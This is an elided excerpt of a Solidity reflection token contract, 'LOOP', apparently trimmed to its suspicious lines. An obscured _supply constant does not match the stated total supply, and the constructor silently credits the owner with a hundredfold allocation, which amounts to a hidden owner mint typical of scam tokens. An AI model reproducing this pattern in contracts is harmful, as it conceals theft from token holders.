...
contract LOOP is Context, IERC20, Ownable {
    ...
    uint256 private constant _supply = MAX / 1.1579209e53;
    uint256 private constant _totalSupply = 1e12 * 1e8;
    uint256 private _rTotal = (MAX - (MAX % _supply));
    ...
    constructor (string memory name_, string memory symbol_, uint8 decimals_, address _Owner) {
        ...
        _rOwned[_Owner] = _rOwned[_Owner].add(100*(_totalSupply.mul(currentRate)));
    ...
    function reflectionFromToken(uint256 tAmount, bool deductTransferFee) private view returns(uint256) {
        require(tAmount <= _supply, "Amount must be less than supply");
    ...
    function _getCurrentSupply() public view returns(uint256, uint256) {
        ...
        uint256 tSupply = _supply;      
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _supply);
            rSupply = rSupply.sub(_rOwned[_excluded[i]]);
            tSupply = tSupply.sub(_tOwned[_excluded[i]]);
        }
        if (rSupply < _rTotal.div(_supply)) return (_rTotal, _supply);
